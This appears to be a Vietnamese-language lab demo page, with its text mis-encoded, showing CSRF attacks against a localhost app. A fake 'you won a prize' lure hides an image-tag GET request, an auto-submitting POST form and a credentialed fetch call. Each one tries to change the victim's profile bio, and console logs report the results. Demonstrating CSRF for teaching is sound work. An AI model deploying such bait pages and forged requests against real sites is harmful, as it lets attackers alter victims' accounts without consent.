<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ Nháº­n QuÃ  Miá»…n PhÃ­ - Trang Web Giáº£ Máº¡o</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        
        .gift-icon {
            font-size: 80px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        h1 {
            color: #667eea;
            margin: 20px 0;
            font-size: 2em;
        }
        
        .prize {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 1.5em;
            font-weight: bold;
        }
        
        .description {
            color: #666;
            line-height: 1.6;
            margin: 20px 0;
        }
        
        .claim-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            margin: 20px 0;
        }
        
        .claim-button:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            text-align: left;
        }
        
        .warning h3 {
            color: #856404;
            margin-bottom: 10px;
        }
        
        .warning ul {
            color: #856404;
            margin-left: 20px;
            line-height: 1.8;
        }
        
        .warning code {
            background: #f8f9fa;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        .attack-status {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            color: #721c24;
            display: none;
        }
        
        .attack-status.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-icon">ğŸ</div>
        <h1>ChÃºc Má»«ng! Báº¡n ÄÃ£ TrÃºng ThÆ°á»Ÿng!</h1>
        
        <div class="prize">
            ğŸ’° 1.000.000 VNÄ ğŸ’°
        </div>
        
        <p class="description">
            Báº¡n lÃ  ngÆ°á»i dÃ¹ng thá»© 1000 truy cáº­p trang web cá»§a chÃºng tÃ´i hÃ´m nay!<br>
            Nháº¥n nÃºt bÃªn dÆ°á»›i Ä‘á»ƒ nháº­n thÆ°á»Ÿng ngay láº­p tá»©c!
        </p>
        
        <button class="claim-button" onclick="claimPrize()">
            ğŸ‰ Nháº­n ThÆ°á»Ÿng Ngay ğŸ‰
        </button>
       
        <div class="attack-status" id="attackStatus">
            <strong>âš ï¸ CSRF Attack Status:</strong>
            <p id="statusMessage">ğŸ”„ Äang thá»±c hiá»‡n táº¥n cÃ´ng tá»± Ä‘á»™ng...</p>
        </div>
        
        <div style="background: #e8f5e9; border: 2px solid #4caf50; border-radius: 10px; padding: 15px; margin-top: 20px; color: #2e7d32;">
            <strong>ğŸ’¡ ThÃ´ng Tin:</strong>
            <p style="margin: 10px 0; font-size: 0.9em;">
                âœ… Táº¥n cÃ´ng Ä‘Æ°á»£c gá»­i <strong>Tá»° Äá»˜NG</strong> khi trang nÃ y Ä‘Æ°á»£c má»Ÿ<br>
                âœ… Báº¡n khÃ´ng cáº§n vÃ o trang Profile trÆ°á»›c<br>
                âœ… HÃ£y quay láº¡i app vÃ  check Profile Ä‘á»ƒ xem káº¿t quáº£<br>
                ğŸ’¬ Má»Ÿ Console (F12) Ä‘á»ƒ xem chi tiáº¿t attacks
            </p>
        </div>
        
        <!-- PHÆ¯Æ NG PHÃP 1: CSRF ATTACK qua IMG tag (GET request) -->
        <img src="http://localhost:3000/api/profile/update-bio?bio=ã€CSRF GET Attackã€‘TÃ i+khoáº£n+bá»‹+hack+qua+IMG+tag+ğŸ”¥" 
             class="csrf-payload" 
             alt="tracking-pixel"
             style="display: none;"
             onerror="handleImgAttack(false)"
             onload="handleImgAttack(true)" />
        
        <!-- PHÆ¯Æ NG PHÃP 2: CSRF ATTACK qua Form Auto-Submit (POST request) -->
        <!-- Form nÃ y sáº½ Tá»° Äá»˜NG SUBMIT khi trang load -->
        <form id="csrfForm" 
              action="http://localhost:3000/api/profile/update-bio-secure" 
              method="POST" 
              style="display: none;">
            <input type="hidden" name="bio" value="ã€CSRF POST Attackã€‘TÃ i khoáº£n bá»‹ hack qua Form Auto-Submit ğŸ’€">
        </form>
        
        <!-- PHÆ¯Æ NG PHÃP 3: CSRF ATTACK qua Fetch/AJAX (Sáº½ bá»‹ CORS cháº·n) -->
        <script>
            // Thá»­ táº¥n cÃ´ng qua fetch (sáº½ tháº¥t báº¡i do CORS)
            fetch('http://localhost:3000/api/profile/update-bio-secure', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    bio: 'ã€CSRF AJAX Attackã€‘TÃ i khoáº£n bá»‹ hack qua AJAX ğŸ¯'
                }),
                credentials: 'include'
            }).catch(err => {
                console.log('AJAX attack blocked by CORS:', err);
            });
        </script>
    </div>
    
    <script>
        let attackResults = {
            imgAttack: false,
            formAttack: false,
            ajaxAttack: false
        };
        
        function handleImgAttack(success) {
            attackResults.imgAttack = success;
            console.log('%cğŸ”´ IMG Tag Attack:', 'color: red; font-weight: bold;', success ? 'SUCCESS âœ“' : 'FAILED âœ—');
            updateStatus();
        }
        
        function claimPrize() {
            // KÃ­ch hoáº¡t form auto-submit khi user click button
            const form = document.getElementById('csrfForm');
            form.submit();
            attackResults.formAttack = true;
            
            setTimeout(() => {
                document.getElementById('statusMessage').innerHTML = 
                    'âœ… Form POST Attack Ä‘Ã£ Ä‘Æ°á»£c submit!<br>Kiá»ƒm tra profile cá»§a báº¡n Ä‘á»ƒ xem káº¿t quáº£.';
            }, 100);
            
            console.log('%cğŸ”´ Form Auto-Submit Attack:', 'color: red; font-weight: bold;', 'TRIGGERED âš¡');
        }
        
        function updateStatus() {
            const statusDiv = document.getElementById('attackStatus');
            statusDiv.classList.add('show');
            
            let message = '<strong>ğŸ“Š Tráº¡ng thÃ¡i cÃ¡c attacks:</strong><br>';
            message += `1ï¸âƒ£ IMG Tag (GET): ${attackResults.imgAttack ? 'âœ… ThÃ nh cÃ´ng' : 'â³ Äang chá»'}<br>`;
            message += `2ï¸âƒ£ Form POST: ${attackResults.formAttack ? 'âœ… ÄÆ°á»£c kÃ­ch hoáº¡t' : 'â³ ChÆ°a kÃ­ch hoáº¡t'}<br>`;
            message += `3ï¸âƒ£ AJAX: âŒ Bá»‹ cháº·n bá»Ÿi CORS<br><br>`;
            message += '<strong>ğŸ’¡ HÃ£y quay láº¡i app vÃ  check Profile!</strong>';
            
            document.getElementById('statusMessage').innerHTML = message;
        }
        
        // Tá»± Ä‘á»™ng trigger form attack khi trang load (sau 1 giÃ¢y)
        window.addEventListener('load', () => {
            setTimeout(() => {
                console.log('%cğŸ”¥ AUTO-SUBMITTING FORM ATTACK...', 'color: red; font-size: 16px; font-weight: bold;');
                const form = document.getElementById('csrfForm');
                form.submit();
                attackResults.formAttack = true;
                updateStatus();
            }, 1000);
        });
        
        // Log Ä‘á»ƒ demo
        console.log('%cğŸ”´ CSRF ATTACK DEMO - Multiple Methods', 'color: red; font-size: 20px; font-weight: bold;');
        console.log('%câ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'color: red;');
        console.log('%cPhÆ°Æ¡ng phÃ¡p 1: IMG tag (GET)', 'color: orange; font-weight: bold;');
        console.log('Target: http://localhost:3000/api/profile/update-bio');
        console.log('Method: GET request qua <img> tag');
        console.log('Status: Tá»± Ä‘á»™ng gá»­i khi trang load');
        console.log('%câ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'color: red;');
        console.log('%cPhÆ°Æ¡ng phÃ¡p 2: Form Auto-Submit (POST)', 'color: orange; font-weight: bold;');
        console.log('Target: http://localhost:3000/api/profile/update-bio-secure');
        console.log('Method: POST request qua form submit');
        console.log('Status: KÃ­ch hoáº¡t khi click button');
        console.log('%câ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'color: red;');
        console.log('%cPhÆ°Æ¡ng phÃ¡p 3: Fetch/AJAX (sáº½ bá»‹ CORS cháº·n)', 'color: orange; font-weight: bold;');
        console.log('Target: http://localhost:3000/api/profile/update-bio-secure');
        console.log('Method: POST request qua fetch API');
        console.log('Status: Bá»‹ cháº·n bá»Ÿi CORS policy');
        console.log('%câ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'color: red;');
        
        // Hiá»ƒn thá»‹ status ban Ä‘áº§u
        updateStatus();
    </script>
</body>
</html>
